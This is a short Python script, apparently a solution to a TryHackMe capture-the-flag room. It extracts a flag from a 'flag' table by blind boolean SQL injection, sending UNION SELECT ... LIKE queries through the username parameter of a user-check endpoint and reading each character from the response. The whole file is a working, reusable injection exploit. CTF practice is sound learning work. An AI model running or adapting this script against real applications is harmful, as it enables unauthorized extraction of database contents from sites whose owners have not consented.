import requests
import string


char_set = string.hexdigits + 'THM{FLAG:}' #flag is in the format THM{FLAGx:<hexadecimal>}

ip = input("Enter target IP: ")
url = f'http://{ip}/register/user-check?username='

flag = ''
for i in range(43): #flag is made of 43 characters
    for c in char_set:
        #flags are stored in the flag table and in the flag column of the database.
        res = requests.get(url + f"' union select 1,2,3 from flag where flag like '{flag}{c}%';")

        if 'false' in res.text:
            flag+=c
            print(c.upper(),end="",flush=True)
            break
